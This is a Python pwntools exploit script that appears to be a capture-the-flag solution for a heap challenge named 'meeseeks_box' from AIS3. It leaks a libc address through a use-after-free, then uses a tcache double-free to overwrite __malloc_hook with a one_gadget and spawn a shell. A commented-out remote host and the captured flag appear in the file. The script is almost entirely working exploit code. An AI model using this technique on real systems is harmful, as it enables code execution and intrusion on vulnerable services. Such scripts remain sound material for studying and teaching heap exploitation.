#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./meeseeks_box')
#r = remote('60.250.197.227',10005)
libc = ELF('./libc.so.6')

def cmd(x):
    r.recvuntil('> ')
    r.sendline(str(x))

def create(l,s):
    cmd(1)
    r.recvuntil('Size: ')
    r.sendline(str(int(l)))
    r.recvuntil('Request: ')
    r.sendline(s)

def show(i):
    cmd(2)
    r.recvuntil('ID: ')
    r.sendline(str(i))

def delete(i):
    cmd(3)
    r.recvuntil('ID: ')
    r.sendline(str(i))


create(0x49f, 'a') #0
create(0x68, 'b') #1

delete(0)
show(4)
libc_base = u64(r.recvuntil('\n')[:-1].ljust(8,'\x00')) - 0x3ebca0
malloc_hook = libc_base + libc.symbols['__malloc_hook']
print 'libc_base :',hex(libc_base)
print 'malloc_hook :',hex(malloc_hook)
one_gadget = libc_base + 0x10a38c 

create(0x68, 'd') #2

#create(0x49f, 'a') #0
delete(2)
delete(2)
create(0x68,p64(malloc_hook-0x1b))
create(0x68,'e')
create(0x68,'a'*0x1b + p64(one_gadget))

# AIS3{G0D_d4mn!_Mr._M3e5EEk5_g1V3S_Y0U_@_sH31l}
r.interactive()
